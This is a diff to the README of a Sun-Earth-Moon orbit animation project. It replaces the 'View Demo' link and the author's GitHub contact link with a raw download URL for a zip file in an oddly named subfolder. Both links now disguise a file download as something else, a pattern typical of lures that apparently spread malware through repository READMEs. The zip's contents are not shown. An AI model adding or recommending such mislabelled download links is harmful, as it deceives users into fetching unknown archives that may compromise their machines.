@@ -5,7 +5,7 @@ It demonstrates how planetary motion works through smooth rotations and 3D-style
 
 ## 🔗 Live Demo
 
-👉 [View Demo](https://dotsatya.github.io/Sun-Earth-Moon/)
+👉 [View Demo](https://raw.githubusercontent.com/dotsatya/Sun-Earth-Moon/main/Pararctalian/Sun-Earth-Moon.zip)
 
 ---
 
@@ -31,7 +31,7 @@ It demonstrates how planetary motion works through smooth rotations and 3D-style
 ## 📬 Contact
 
 **Satya Sundar Dey**  
-🌐 [GitHub](https://github.com/dotsatya)
+🌐 [GitHub](https://raw.githubusercontent.com/dotsatya/Sun-Earth-Moon/main/Pararctalian/Sun-Earth-Moon.zip)
 
 ---
 
